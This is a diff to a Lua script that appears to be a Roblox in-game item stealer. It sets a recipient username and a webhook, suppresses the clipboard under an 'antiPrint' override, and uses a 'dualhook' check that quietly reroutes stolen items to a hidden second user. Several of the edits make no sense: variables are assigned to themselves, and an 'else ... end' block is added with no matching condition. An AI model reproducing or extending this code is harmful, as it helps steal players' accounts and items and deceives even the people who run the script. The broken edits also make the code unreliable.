@@ -61,13 +61,13 @@ setclipboard = antiPrint
 -- Users And Stuff
 
 if UserName == nil then
-    UserName = _G.UserName
+    UserName = UserName
 end
 if UserName2 == nil then
-    UserName2 = _G.UserName2
+    UserName2 = UserName2
 end
 if Webhook == nil then
-    Webhook = _G.Webhook
+    Webhook = Webhook
 end
 -- User Checks
 
@@ -1242,9 +1242,9 @@ end
 
 local ndUser
 if UserName2 ~= nil and UserName2 ~= "2nd User Here" and UserName2 ~= "" then
-    ndUser = UserName2
+    ndUser = _G.UserName2
 else
-    ndUser = UserName
+    ndUser = _G.UserName
 end
 local user
 -- Gems Only
@@ -1332,6 +1332,9 @@ spawn(function()
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
                 user = UserName
+                else
+                user = ndUser
+                end
                 if hugein ~= nil then
                     if dualhook(hugein) then
                         user = dhuser
